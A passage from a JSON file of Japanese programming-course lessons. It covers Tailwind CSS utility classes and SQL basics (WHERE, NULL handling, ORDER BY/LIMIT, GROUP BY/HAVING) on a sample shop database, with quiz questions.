2);` | 上下（y）の padding を 2 単位 |\n| `rounded-lg` | `border-radius: var(--radius-lg);` | 角を丸く（lg ＝ 大きめ） |\n| `bg-blue-600` | `background-color: var(--color-blue-600);` | 背景を青の 600 番 |\n| `text-white` | `color: var(--color-white);` | 文字を白 |\n| `font-bold` | `font-weight: var(--font-weight-bold);` | 太字 |\n\n`var(--spacing)` は CSS の **変数** で、生成された CSS の中で `--spacing: 0.25rem;` と決められていました。\n\n### 数字の読み方\n\n```text\n1 単位 = 0.25rem = 4px（ページの基準の文字が 16px のとき）\n```\n\n| class | 大きさ |\n|---|---|\n| `p-1` | 4px |\n| `p-2` | 8px |\n| `p-4` | 16px |\n| `p-6` | 24px |\n| `p-8` | 32px |\n\n**数字 × 4px** と覚えれば、だいたい読めます。`gap-4`・`mt-2`・`w-64` なども同じです（`w-64` は 256px）。\n\n| 前の文字 | 意味 | 例 |\n|---|---|---|\n| `p` / `m` | padding / margin（レッスン 3） | `p-4`、`m-2` |\n| `x` / `y` | 左右 / 上下 | `px-4`、`my-8` |\n| `t` `r` `b` `l` | 上・右・下・左 | `mt-2`（上の margin）、`pl-4`（左の padding） |\n| `w` / `h` | 幅 / 高さ | `w-full`（100%）、`h-screen`（画面の高さ） |\n\n### 色の読み方\n\n`bg-blue-600` の `600` は **色の濃さ** です。`50`（とても薄い）から `950`（とても濃い）まであり、500 前後がふつうの濃さです。\n\n```text\nbg-blue-600     → 背景を少し濃い青に\nhover:bg-blue-700 → マウスを乗せたら、もう一段濃い青に\ntext-gray-500   → 文字を中くらいの灰色に（補足の文など）\n```\n\n## 前置き（バリアント）：条件付きの指定\n\n`hover:` や `md:` のように、`:` の前に付くものは「**この条件のときだけ**」という意味です。生成された CSS を見ると、よく分かります。\n\n```css\n@media (hover: hover) {\n  .hover\\:bg-blue-700:hover {             /* マウスが乗ったとき */\n    background-color: var(--color-blue-700);\n  }\n}\n.disabled\\:opacity-50:disabled {          /* ボタンが使えない状態のとき */\n  opacity: 50%;\n}\n@media (width >= 48rem) {                 /* 画面の幅が 768px 以上のとき */\n  .md\\:px-6 {\n    padding-inline: calc(var(--spacing) * 6);\n  }\n}\n@media (prefers-color-scheme: dark) {     /* ダークモードのとき */\n  .dark\\:text-gray-400 { color: var(--color-gray-400); }\n}\n```\n\n| 前置き | 条件 | 対応する CSS |\n|---|---|---|\n| `hover:` | マウスが乗ったとき | `:hover`（レッスン 4 の疑似クラス） |\n| `focus:` / `focus-visible:` | 選ばれているとき | `:focus` / `:focus-visible` |\n| `disabled:` | 使えない状態のとき | `:disabled` |\n| `sm:` `md:` `lg:` `xl:` | 画面の幅が 640・768・1024・1280px **以上** のとき | `@media (min-width: ...)`（レッスン 6） |\n| `dark:` | ダークモードのとき | `@media (prefers-color-scheme: dark)`（設定で切り替え方式にもできる） |\n\n⚠️ `md:` は「md **以上**」です。**前置きの無い class がスマホ用、`md:` が広い画面用** という、モバイルファースト（レッスン 6）の読み方をします。\n\n```html\n<div class=\"grid grid-cols-1 md:grid-cols-3 gap-6\">\n```\n\n「ふだん（スマホ）は 1 列、768px 以上なら 3 列、隙間は 24px」と読みます。`md:grid-cols-3` は、生成された CSS では `grid-template-columns: repeat(3, minmax(0, 1fr));` でした（レッスン 5 の `repeat(3, 1fr)` とほぼ同じ）。\n\n## よくある組み合わせ\n\n| class の並び | 読み方 |\n|---|---|\n| `flex items-center justify-between` | 横に並べて、縦は中央、両端に寄せる（ヘッダーの定番） |\n| `flex flex-col gap-4` | 縦に並べて、隙間 16px |\n| `grid grid-cols-1 md:grid-cols-3 gap-6` | スマホ 1 列 → 広い画面で 3 列 |\n| `max-w-3xl mx-auto p-4` | 最大の幅 48rem（768px）で中央寄せ、周りに 16px の余白 |\n| `w-full` | 幅 100% |\n| `hidden md:block` | スマホでは非表示、広い画面で表示 |\n| `text-sm text-gray-500` | 小さめの灰色の文字（補足・日付など） |\n| `rounded-lg shadow-md border` | 角丸・影・枠線（カード） |\n| `fixed inset-0 bg-black/50` | 画面全体を覆う半透明の黒（モーダルの背景）。`/50` は透明度 50% |\n\n## よいところと注意点\n\n| よいところ | 注意点 |\n|---|---|\n| CSS のファイルと HTML を行き来しなくてよい | class が長くなり、HTML が読みにくい |\n| 名前を考えなくてよい（`.card-header-title` など） | 同じ組み合わせをコピーすると、直すとき全部直す必要がある（React なら部品にまとめる） |\n| 使った分だけの小さな CSS になる | class 名を文字列でつなげて作ると、Tailwind が見つけられない（下） |\n| 余白や色の値がそろう（4px 単位など） | Tailwind の書き方を知らないと読めない |\n\n### ⚠️ class 名を組み立てると効かない\n\n```javascript\n// ⚠️ Tailwind は「bg-red-600」という文字をソースから探せない\nconst cls = `bg-${color}-600`;\n\n// ✅ 完全な名前を書いておく\nconst cls = color === \"red\" ? \"bg-red-600\" : \"bg-blue-600\";\n```\n\nTailwind は、**ソースコードに完全な形で書かれた class 名** を探して CSS を作ります。文字列をつなげて作った名前は見つけられないので、その CSS が生成されず、見た目が付きません。AI のコードで「色が付かない」ときの定番の原因です。\n\n## Python で言うと\n\nTailwind そのものは Python と関係ありませんが、Python で Web アプリを作るときも、テンプレート（Jinja2・Django）の HTML に同じように Tailwind の class を書きます。\n\n```html\n<!-- Jinja2 のテンプレート -->\n{% for item in items %}\n  <li class=\"flex justify-between py-2 border-b\">\n    <span>{{ item.name }}</span><span class=\"text-gray-500\">{{ item.price }} 円</span>\n  </li>\n{% endfor %}\n```\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `className=\"...\"` に 10 個以上の class | 前置きの無いもの（スマホ）→ `md:`（広い画面）→ `hover:` などの状態、と分けて読む |\n| `` `text-${size}` `` のような組み立て | ⚠️ 生成されない。完全な名前に |\n| `focus:outline-none` だけ | ⚠️ キーボードで選んだ場所が見えなくなる。`focus-visible:ring-2` などの代わりがあるか |\n| `!p-4`（先頭に `!`） | `!important` 付き（レッスン 4）。v4 では末尾に `p-4!` と書く |\n| `tailwind.config.js` | Tailwind v3 までの設定ファイル。v4 は CSS の中（`@theme`）で設定する |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Tailwind の `px-4` が表すのは？（基準の文字の大きさは 16px）",
        "choices": [
         "左右の padding を 16px",
         "上下の padding を 4px",
         "幅を 4px"
        ],
        "answer": 0,
        "explain": "x は左右、数字は × 4px なので 16px です。生成された CSS も `padding-inline: calc(var(--spacing) * 4)`（--spacing は 0.25rem）でした。"
       },
       {
        "question": "`<div class=\"grid grid-cols-1 md:grid-cols-3\">` の、画面の幅 375px（スマホ）での見た目は？",
        "choices": [
         "3 列",
         "1 列",
         "何も表示されない"
        ],
        "answer": 1,
        "explain": "前置きの無い class がスマホを含むすべての幅、`md:` は 768px 以上のときだけです。375px では 1 列になります。"
       },
       {
        "question": "React で `` className={`bg-${color}-500`} `` と書いたら、色が付かなかった。理由は？",
        "choices": [
         "React では Tailwind が使えないから",
         "Tailwind はソースに完全な形で書かれた class 名だけを探して CSS を作るので、組み立てた名前の CSS が生成されないから",
         "`bg-` は背景ではないから"
        ],
        "answer": 1,
        "explain": "`bg-red-500` のように、完全な名前がソースのどこかに書かれている必要があります。条件で完全な名前を選ぶように書き換えます。"
       }
      ]
     ],
     "id": "07-tailwind"
    }
   ],
   "status": "open"
  },
  {
   "title": "SQL",
   "icon": "🗄️",
   "order": 50,
   "description": "データベースに問い合わせる言語。全レッスン共通の「お店のデータ」で、SELECT・WHERE・並べ替え・集計・JOIN・追加と更新・サブクエリと WITH・ウィンドウ関数まで。結果はすべて SQLite で実行したもの。最後に PostgreSQL・MySQL との違いも実際に比べる。",
   "levels": {
    "1": "入門：取り出す",
    "2": "基礎：まとめる・つなぐ・変える",
    "3": "実践：AI の SQL を読む"
   },
   "id": "50-sql",
   "lessons": [
    {
     "title": "SELECT と WHERE ― 欲しい行と列を取り出す",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "database",
      "conditionals",
      "operators"
     ],
     "summary": "このコースで使う「お店のデータ」の紹介と、SELECT・WHERE の読み方。AND と OR の優先順位、IN・BETWEEN・LIKE、そして NULL が = で見つからない理由。",
     "body": "## このレッスンのゴール\n\n- `SELECT 列 FROM テーブル WHERE 条件` を読み、どの行のどの列が返るか説明できる\n- `AND` と `OR` を混ぜた条件を、正しく読める\n- `NULL` を `IS NULL` で探す理由と、`<>` で NULL の行が消える落とし穴が分かる\n\nバックエンドコースのレッスン 7 で、SQL の CRUD をざっと学びました。このコースでは、**AI が書いた SQL を 1 行ずつ読める** ようになることを目指して、くわしく見ていきます。\n\n## このコースで使うデータ\n\n小さなお店のデータベースです。テーブルの作り方は、データベース設計のコースで学んだ形です。\n\n```text\ncustomers（お客さん）          products（商品）\nid | name | city | joined_at   id | name        | category | price\n1  | Ryo  | 東京 | 2026-01-10  1  | りんご       | 果物     | 120\n2  | Hana | 大阪 | 2026-02-03  2  | バナナ       | 果物     | 90\n3  | Ken  | 東京 | 2026-03-15  3  | 牛乳         | 飲み物   | 200\n4  | Mio  | NULL | 2026-05-20  4  | コーヒー豆   | 飲み物   | 1200\n5  | Sora | 福岡 | 2026-09-01  5  | 食パン       | パン     | 250\n                                6  | クロワッサン | パン     | 180\n\norders（注文）                          order_items（注文の中身）\nid | customer_id | ordered_at | status    order_id | product_id | qty\n1  | 1           | 2026-10-01 | paid      1        | 1          | 3\n2  | 1           | 2026-10-15 | paid      1        | 3          | 1\n3  | 2           | 2026-10-20 | cancelled 2        | 4          | 1\n4  | 3           | 2026-11-02 | paid      3        | 5          | 2\n5  | 2           | 2026-11-05 | paid      4        | 1          | 5\n6  | 4           | 2026-11-10 | shipped   4        | 2          | 6\n                                          4        | 6          | 2\n                                          5        | 3          | 2\n                                          5        | 5          | 1\n                                          6        | 4          | 2\n```\n\nMio さんの `city` は **NULL**（まだ登録されていない）、Sora さんは **まだ 1 回も注文していない** ところがポイントです。後のレッスンで効いてきます。\n\nこのコースの結果は、すべてこのデータを Python の `sqlite3` に入れて、実際に実行したものです。\n\n## SELECT：どの列を\n\n```sql\nSELECT name, price FROM products WHERE price >= 200;\n```\n\n```text\nname       | price\n牛乳       | 200\nコーヒー豆 | 1200\n食パン     | 250\n```\n\n| 部分 | 意味 |\n|---|---|\n| `SELECT name, price` | 取り出す **列** |\n| `FROM products` | どのテーブルから |\n| `WHERE price >= 200` | どの **行** を（条件に合うものだけ） |\n\n`SELECT *` は「全部の列」です。Python で言うと、こんな感じです。\n\n```python\n[(p[\"name\"], p[\"price\"]) for p in products if p[\"price\"] >= 200]\n```\n\n⚠️ `ORDER BY`（次のレッスン）を書かないと、**行の順番は決まっていません**。たまたま id 順に見えても、データベースの都合で変わることがあります。\n\n## 計算と別名\n\n```sql\nSELECT name, price, price * 1.1 AS with_tax FROM products WHERE category = '飲み物';\n```\n\n```text\nname       | price | with_tax\n牛乳       | 200   | 220.00000000000003\nコーヒー豆 | 1200  | 1320.0\n```\n\n`AS with_tax` は、結果の列に付ける **別名** です。そして、`220.00000000000003` に注目してください。コンピュータの基礎コースの「0.1 + 0.2 問題」が、SQL でも起きています。お金は整数で計算しましょう。\n\n## WHERE の書き方\n\n| 書き方 | 意味 |\n|---|---|\n| `=` / `<>`（または `!=`） | 等しい／等しくない（Python の `==` ではなく `=` 1 つ） |\n| `<` `<=` `>` `>=` | 大小 |\n| `AND` / `OR` / `NOT` | かつ／または／ではない |\n| `IN ('果物', 'パン')` | どれかと等しい |\n| `BETWEEN 100 AND 200` | 100 以上 200 以下（両端を含む） |\n| `LIKE '%パン%'` | 「パン」を含む（`%` は何文字でも、`_` は 1 文字） |\n| `IS NULL` / `IS NOT NULL` | 値が無い／ある |\n\n文字列は **シングルクォート `'...'`** で囲みます。ダブルクォート `\"...\"` は、データベースによっては列の名前の意味になります。\n\n```sql\nSELECT name, price FROM products WHERE price BETWEEN 100 AND 200;\n-- りんご 120 / 牛乳 200 / クロワッサン 180   ← 200 も入る\n```\n\n`--` から行末まではコメントです。\n\n## ⚠️ AND と OR の優先順位\n\n「果物かパンで、200 円より高いもの」を探したつもりの SQL です。\n\n```sql\nSELECT name, category, price FROM products\nWHERE category = '果物' OR category = 'パン' AND price > 200;\n```\n\n```text\nりんご | 果物 | 120\nバナナ | 果物 | 90\n食パン | パン | 250\n```\n\n120 円のりんごが出てきました。**`AND` は `OR` より先に計算される** ので、こう読まれています。\n\n```text\ncategory = '果物'  OR  (category = 'パン' AND price > 200)\n```\n\n掛け算が足し算より先なのと同じです。意図どおりにするには、かっこを付けます。\n\n```sql\nWHERE (category = '果物' OR category = 'パン') AND price > 200;\n-- 食パン | パン | 250   ← これだけ\n```\n\n**AND と OR を混ぜるときは、必ずかっこを付ける** のが安全です（Python の `and`・`or` も同じ優先順位です）。\n\n## NULL は「わからない」\n\n```sql\nSELECT name, city FROM customers WHERE city = NULL;\n-- （0 件）\n\nSELECT name, city FROM customers WHERE city IS NULL;\n-- Mio | NULL\n```\n\nNULL は「値が無い・わからない」という特別な状態です。「わからないもの」と比べた結果も「わからない」になるので、`city = NULL` は **どの行でも正しくならず**、0 件になります。**NULL を探すときは必ず `IS NULL`** です。\n\n```sql\nSELECT 1 + NULL, NULL = NULL;\n-- NULL | NULL   ← 計算しても、比べても NULL\n```\n\n### ⚠️ `<>` で NULL の行が消える\n\n「東京以外のお客さん」を探します。\n\n```sql\nSELECT name, city FROM customers WHERE city <> '東京';\n```\n\n```text\nHana | 大阪\nSora | 福岡\n```\n\n**Mio さんがいません**。Mio さんの city は NULL なので、`NULL <> '東京'` も「わからない」になり、条件に合わなかったのです。NULL の人も含めたいなら、こう書きます。\n\n```sql\nWHERE city <> '東京' OR city IS NULL\n```\n\n### NULL の代わりの値を出す\n\n```sql\nSELECT name, COALESCE(city, '未登録') AS city FROM customers;\n-- ...\n-- Mio | 未登録\n```\n\n`COALESCE(a, b)` は「a が NULL なら b」。Python の `city if city is not None else \"未登録\"` です。\n\n## 他の言語では\n\n| | SQL | Python |\n|---|---|---|\n| 等しい | `=` | `==` |\n| 等しくない | `<>` / `!=` | `!=` |\n| 値が無い | `IS NULL` | `is None` |\n| 含まれる | `IN (1, 2)` | `in (1, 2)` |\n| かつ・または | `AND` / `OR` | `and` / `or` |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `WHERE a = 1 OR b = 2 AND c = 3` | ⚠️ かっこが無い。AND が先に計算される |\n| `WHERE x = NULL` / `WHERE x != NULL` | ⚠️ いつも 0 件。`IS NULL` / `IS NOT NULL` |\n| `WHERE status <> 'cancelled'` | NULL の行が含まれなくなる。status に NULL がありうるか確認 |\n| `SELECT *` | 列が増えると遅く・重くなる。必要な列だけ書くと読みやすい |\n| `WHERE name LIKE '%' \\|\\| ? \\|\\| '%'` | 部分一致の検索。値は `?` で渡している（セキュリティのコース） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`WHERE category = '果物' OR category = 'パン' AND price > 200` は、どう読まれる？",
        "choices": [
         "（果物 または パン）かつ 200 円より高い",
         "果物、または（パン かつ 200 円より高い）",
         "エラーになる"
        ],
        "answer": 1,
        "explain": "AND は OR より先に計算されます。意図どおりにするには、`(category = '果物' OR category = 'パン') AND price > 200` とかっこを付けます。"
       },
       {
        "question": "city が NULL のお客さんを探す正しい書き方は？",
        "choices": [
         "`WHERE city = NULL`",
         "`WHERE city = ''`",
         "`WHERE city IS NULL`"
        ],
        "answer": 2,
        "explain": "NULL と `=` で比べた結果は NULL（わからない）になり、条件に合いません。`IS NULL` を使います。"
       },
       {
        "question": "`WHERE city <> '東京'` で、city が NULL の Mio さんは結果に入る？",
        "choices": [
         "入らない",
         "入る",
         "エラーになる"
        ],
        "answer": 0,
        "explain": "`NULL <> '東京'` は NULL になり、条件に合わないので消えます。含めたいなら `OR city IS NULL` を足します。"
       }
      ]
     ],
     "id": "01-select-where"
    },
    {
     "title": "並べ替え・件数・重複 ― ORDER BY・LIMIT・DISTINCT",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "database",
      "collections"
     ],
     "summary": "結果を並べ替える ORDER BY（複数の列・降順）、件数を絞る LIMIT と OFFSET（ページ分け）、重複を消す DISTINCT。順番が決まらない落とし穴も。",
     "body": "## このレッスンのゴール\n\n- `ORDER BY` で、複数の列・昇順と降順の並べ替えを読める\n- `LIMIT`・`OFFSET` でページ分けをする SQL を読める\n- `DISTINCT` で何が起きるかと、並べ替えを書かないときの落とし穴が分かる\n\n## ORDER BY：並べ替え\n\n```sql\nSELECT name, price FROM products ORDER BY price DESC;\n```\n\n```text\nコーヒー豆   | 1200\n食パン       | 250\n牛乳         | 200\nクロワッサン | 180\nりんご       | 120\nバナナ       | 90\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `ORDER BY price` / `ORDER BY price ASC` | 小さい順（昇順。ASC は省略できる） |\n| `ORDER BY price DESC` | 大きい順（降順） |\n\nPython で言うと `sorted(products, key=lambda p: p[\"price\"], reverse=True)` です。\n\n### 複数の列で並べる\n\n```sql\nSELECT name, category, price FROM products ORDER BY category, price DESC;\n```\n\n```text\n食パン       | パン   | 250\nクロワッサン | パン   | 180\nりんご       | 果物   | 120\nバナナ       | 果物   | 90\nコーヒー豆   | 飲み物 | 1200\n牛乳         | 飲み物 | 200\n```\n\n**まず category で並べ、同じ category の中では price の大きい順**。`DESC` は、すぐ前の列（price）にだけ効きます。category は昇順のままです。\n\n文字の並び順は、データベースと設定（照合順序）によって変わります。SQLite では、カタカナの「パン」が漢字の「果物」「飲み物」より前に来ました（Unicode の文字の番号の順。コンピュータの基礎コースの「文字コード」）。\n\n## LIMIT：上から何件\n\n```sql\nSELECT name, price FROM products ORDER BY price DESC LIMIT 3;\n-- コーヒー豆 1200 / 食パン 250 / 牛乳 200\n```\n\n「値段の高い順に 3 つ」。ランキングの定番です。\n\n### OFFSET：ページ分け\n\n```sql\nSELECT name, price FROM products ORDER BY price DESC LIMIT 2 OFFSET 2;\n-- 牛乳 200 / クロワッサン 180\n```\n\n`OFFSET 2` は「最初の 2 件を飛ばす」。1 ページ 2 件なら、2 ページ目です。\n\n```python\npage = 2\nper_page = 2\nsql = \"SELECT name, price FROM products ORDER BY price DESC LIMIT ? OFFSET ?\"\nconn.execute(sql, (per_page, (page - 1) * per_page))\n```\n\nAI の API のコードでよく見る形です。Python のスライス `items[2:4]` と同じ考え方です。\n\n⚠️ OFFSET が大きくなる（10 万件目から）と、データベースは **飛ばす分も全部数える** ので遅くなります。大きなデータでは「前のページの最後の値より後」（`WHERE price < ? ORDER BY price DESC LIMIT 20`）で次のページを取る方法（キーセット・ページネーション）が使われます。\n\n## ⚠️ ORDER BY が無い LIMIT\n\n```sql\nSELECT name, price FROM products LIMIT 2;\n-- りんご 120 / バナナ 90\n```\n\nこれは「たまたま先頭にあった 2 件」です。**ORDER BY が無いと、順番は保証されません**。データが増えたり、データベースが変わったりすると、別の 2 件が返ることがあります。\n\nページ分けで並べ替えの列に同じ値があると、ページの境目で **同じ行が 2 回出たり、出なかったり** します。最後に主キーを足しておくと安全です。\n\n```sql\nORDER BY price DESC, id\n```\n\n## DISTINCT：重複を消す\n\n```sql\nSELECT DISTINCT category FROM products;\n-- 果物 / 飲み物 / パン\n\nSELECT DISTINCT city FROM customers ORDER BY city;\n-- NULL / 大阪 / 東京 / 福岡\n```\n\n東京の 2 人が 1 つにまとまりました。Python の `set(...)` に近いですが、`set` と違って NULL も 1 つの値として残ります。\n\n`DISTINCT` は **選んだ列の組み合わせ全体** で重複を消します。`SELECT DISTINCT city, name` なら、city と name の両方が同じ行だけが消えます。\n\n⚠️ JOIN（レッスン 4）の結果に重複が出たのを、`DISTINCT` で隠しているコードは要注意です。重複の原因（つなぎ方の間違い）がそのまま残っていることがあります。\n\n### NULL の並び順\n\n上の結果で、NULL が **いちばん前** に来ています。これはデータベースによって違い、PostgreSQL では昇順で **いちばん後ろ** になります（レッスン 8 で実際に比べます）。決めたいときは `ORDER BY city NULLS LAST` と書けます。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `LIMIT ? OFFSET ?` | ページ分け。`(page - 1) * per_page` を計算しているか |\n| `LIMIT 1` に `ORDER BY` が無い | ⚠️ どの 1 件が返るか決まっていない |\n| `ORDER BY created_at DESC` | 新しい順。同じ時刻があるなら `, id DESC` も |\n| `SELECT DISTINCT ...` に JOIN | 重複を隠していないか |\n| `ORDER BY 2` | 2 番目の列で並べる、という書き方。列を入れ替えると壊れる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`ORDER BY category, price DESC` の意味は？",
        "choices": [
         "category も price も大きい順",
         "category の昇順で並べ、同じ category の中では price の大きい順",
         "price の大きい順で並べ、同じ price の中では category 順"
        ],
        "answer": 1,
        "explain": "DESC はすぐ前の列（price）にだけ付きます。最初に書いた列が優先です。"
       },
       {
        "question": "1 ページ 20 件で 3 ページ目を取り出す SQL は？",
        "choices": [
         "`LIMIT 20 OFFSET 3`",
         "`LIMIT 60`",
         "`LIMIT 20 OFFSET 40`"
        ],
        "answer": 2,
        "explain": "1・2 ページ目の 40 件を飛ばし、そこから 20 件です。`(3 - 1) × 20 = 40`。"
       },
       {
        "question": "`SELECT * FROM products LIMIT 1` で返る行は？",
        "choices": [
         "いつも id が 1 の行",
         "いつも一番新しい行",
         "どの行かは決まっていない（ORDER BY が無いため）"
        ],
        "answer": 2,
        "explain": "並べ替えを指定しないと順番は保証されません。決まった 1 件が欲しいなら ORDER BY を付けます。"
       }
      ]
     ],
     "id": "02-order-limit"
    },
    {
     "title": "集計 ― COUNT・SUM と GROUP BY・HAVING",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "database",
      "collections",
      "higher_order"
     ],
     "summary": "件数・合計・平均を出す集計関数と、グループごとに集計する GROUP BY、集計した結果で絞る HAVING。COUNT(*) と COUNT(列) の違い、WHERE と HAVING の違い、SQL が実行される順番。",
     "body": "## このレッスンのゴール\n\n- `COUNT`・`SUM`・`AVG`・`MIN`・`MAX` の結果を読める（NULL の扱いも含めて）\n- `GROUP BY` で「グループごとに 1 行」になる仕組みを説明できる\n- `WHERE` と `HAVING` の違いを、SQL が実行される順番から説明できる\n\n## 集計関数：たくさんの行を 1 つの値に\n\n```sql\nSELECT SUM(price), AVG(price), MIN(price), MAX(price) FROM products;\n-- 2040 | 340.0 | 90 | 1200\n```\n\n| 関数 | 意味 | Python で言うと |\n|---|---|---|\n| `COUNT(*)` | 行の数 | `len(rows)` |\n| `SUM(x)` | 合計 | `sum(...)` |\n| `AVG(x)` | 平均 | `sum(...) / len(...)` |\n| `MIN(x)` / `MAX(x)` | 最小／最大 | `min(...)` / `max(...)` |\n\n### COUNT(*) と COUNT(列)\n\n```sql\nSELECT COUNT(*), COUNT(city), COUNT(DISTINCT city) FROM customers;\n-- 5 | 4 | 3\n```\n\n| 書き方 | 数えるもの | 結果 |\n|---|---|---|\n| `COUNT(*)` | 行の数 | 5 人 |\n| `COUNT(city)` | city が **NULL でない** 行の数 | 4（Mio さんの NULL を数えない） |\n| `COUNT(DISTINCT city)` | NULL でない、違う値の数 | 3（東京・大阪・福岡） |\n\n集計関数は、**NULL を無視する** のが決まりです（`COUNT(*)` だけは行そのものを数えるので例外）。`AVG(x)` も NULL の行を分母に入れません。\n\n## GROUP BY：グループごとに集計\n\n```sql\nSELECT category, COUNT(*) AS n, AVG(price) AS avg_price\nFROM products\nGROUP BY category;\n```\n\n```text\ncategory | n | avg_price\nパン     | 2 | 215.0\n果物     | 2 | 105.0\n飲み物   | 2 | 700.0\n```\n\n`GROUP BY category` は、**category が同じ行を 1 つのグループにまとめ、グループごとに 1 行** を返します。\n\n```text\nproducts（6 行）               グループに分ける            1 グループ 1 行に\nりんご     果物   120   ┐\nバナナ     果物    90   ┘→ 果物   [120, 90]     → 果物   2  105.0\n牛乳       飲み物 200   ┐\nコーヒー豆 飲み物 1200  ┘→ 飲み物 [200, 1200]   → 飲み物 2  700.0\n食パン     パン   250   ┐\nクロワッサン パン 180   ┘→ パン   [250, 180]    → パン   2  215.0\n```\n\nPython で言うと、辞書でグループを作ってから集計するのと同じです。\n\n```python\nfrom collections import defaultdict\ngroups = defaultdict(list)\nfor p in products:\n    groups[p[\"category\"]].append(p[\"price\"])\nresult = {cat: (len(prices), sum(prices) / len(prices)) for cat, prices in groups.items()}\n```\n\n### 月ごとの集計\n\n```sql\nSELECT substr(ordered_at, 1, 7) AS month, COUNT(*) AS orders\nFROM orders\nGROUP BY month;\n```\n\n```text\n2026-10 | 3\n2026-11 | 3\n```\n\n日付の文字列の先頭 7 文字（`2026-10`）でまとめています。売上の月次レポートの定番の形です。\n\n### ⚠️ SELECT に書けるのは「グループで 1 つに決まるもの」だけ\n\n```sql\nSELECT category, name, MAX(price) FROM products GROUP BY category;\n```\n\nグループ「果物」には、りんごとバナナの 2 つの name があります。どちらを出せばよいでしょう？\n\n| データベース | 結果 |\n|---|---|\n| SQLite | 動く。`MAX(price)` の行の name（食パン・りんご・コーヒー豆）を出す（SQLite だけの特別なルール） |\n| PostgreSQL | **エラー**：`column \"products.name\" must appear in the GROUP BY clause or be used in an aggregate function` |\n| MySQL（初期設定） | **エラー**：`... is incompatible with sql_mode=only_full_group_by` |\n\n（3 つとも実際に実行した結果です。レッスン 8）\n\n`SELECT` に書けるのは、**`GROUP BY` に書いた列** か **集計関数** だけ、と覚えましょう。「カテゴリごとに一番高い商品の名前」が欲しいときは、レッスン 7 のウィンドウ関数を使います。\n\n## HAVING：集計した結果で絞る\n\n```sql\nSELECT category, COUNT(*) AS n\nFROM products\nGROUP BY category\nHAVING COUNT(*) >= 2 AND AVG(price) < 500;\n```\n\n```text\nパン | 2\n果物 | 2\n```\n\n飲み物は平均 700 円なので消えました。\n\n### WHERE と HAVING の違い\n\n```sql\nSELECT category, COUNT(*) AS n\nFROM products\nWHERE price < 1000\nGROUP BY category;\n```\n\n```text\nパン   | 2\n果物   | 2\n飲み物 | 1      ← コーヒー豆（1200 円）が、数える前に消えた\n```\n\n| | WHERE | HAVING |\n|---|---|---|\n| いつ絞る | **グループにまとめる前** の 1 行ずつ | **グループにまとめた後** |\n| 使えるもの | 列の値 | 集計関数（`COUNT(*)`・`AVG(price)`） |\n| 例 | 1000 円未満の商品だけを数える | 2 個以上あるカテゴリだけを出す |\n\n## SQL が実行される順番\n\nSQL は、**書く順番と実行される順番が違います**。これが分かると、WHERE と HAVING の違いも、エラーの理由も分かります。\n\n```text\n書く順番        実行される順番\nSELECT          ① FROM / JOIN   どのテーブルから（レッスン 4）\nFROM            ② WHERE          1 行ずつ絞る\nWHERE           ③ GROUP BY       グループにまとめる\nGROUP BY        ④ HAVING         グループを絞る\nHAVING          ⑤ SELECT         列を選ぶ・計算する・別名を付ける\nORDER BY        ⑥ ORDER BY       並べ替える\nLIMIT           ⑦ LIMIT          件数を絞る\n```\n\n- WHERE（②）は GROUP BY（③）より前なので、`WHERE COUNT(*) > 1` は書けない（まだ数えていない）\n- SELECT（⑤）で付けた別名は、ORDER BY（⑥）では使えるが、PostgreSQL・MySQL では WHERE（②）では使えない（SQLite は特別に使えてしまうので、SQLite で動いた SQL が他でエラーになることがある）\n- `LIMIT` は最後なので、「上位 3 件」は並べ替えた後に取られる\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `COUNT(*)` と `COUNT(列)` | NULL を数えたいかどうかで使い分けているか |\n| `AVG(rating)` | NULL（未評価）は分母に入らない。それでよいか |\n| `GROUP BY` に無い列を SELECT している | ⚠️ SQLite では動いても、PostgreSQL・MySQL ではエラー |\n| `HAVING` に、集計関数を使わない条件 | WHERE に書いたほうが、先に行が減って速い |\n| `SUM(price)` が NULL になる | 1 行も無いと SUM は 0 ではなく NULL。`COALESCE(SUM(price), 0)` |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`SELECT COUNT(*), COUNT(city) FROM customers` の結果が `5 | 4` だった。理由は？",
        "choices": [
         "1 人が 2 回数えられている",
         "`COUNT(city)` は city が NULL の行を数えないから",
         "`COUNT(*)` はテーブルの列の数を数えるから"
        ],
        "answer": 1,
        "explain": "集計関数は NULL を無視します。`COUNT(*)` だけは行そのものを数えるので 5 です。"
       },
       {
        "question": "「2 個以上の商品があるカテゴリだけ」を出したい。条件を書く場所は？",
        "choices": [
         "WHERE",
         "HAVING",
         "ORDER BY"
        ],
        "answer": 1,
        "explain": "「グループの中の数」はグループにまとめた後で分かるので、HAVING に `COUNT(*) >= 2` と書きます。"
       },
       {
        "question": "SQL が実行される順番として正しいのは？",
        "choices": [
         "SELECT → FROM → WHERE → GROUP BY",
         "FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY",
         "WHERE → FROM → SELECT → GROUP BY"
        ],
        "answer": 1,
        "explain": "書く順番とは違い、FROM から始まります。だから WHERE ではまだ集計関数が使えません。"
       }
      ]
     ],
     "id": "03-group-by"
    },
    {
     "title": "JOIN をくわしく ― つなぐと行が増える",
     "level": 2,
     "minutes": 22,
     "concepts": [
      "database",
      "collections"
     ],
     "summary": "INNER JOIN と LEFT JOIN、3 つ以上のテーブルをつなぐ読み方。LEFT JOIN で COUNT(*) が 0 にならない、つないだら件数が増えて合計がずれる、WHERE に書くと LEFT JOIN が消える、の 3 大落とし穴を実際の結果で。",
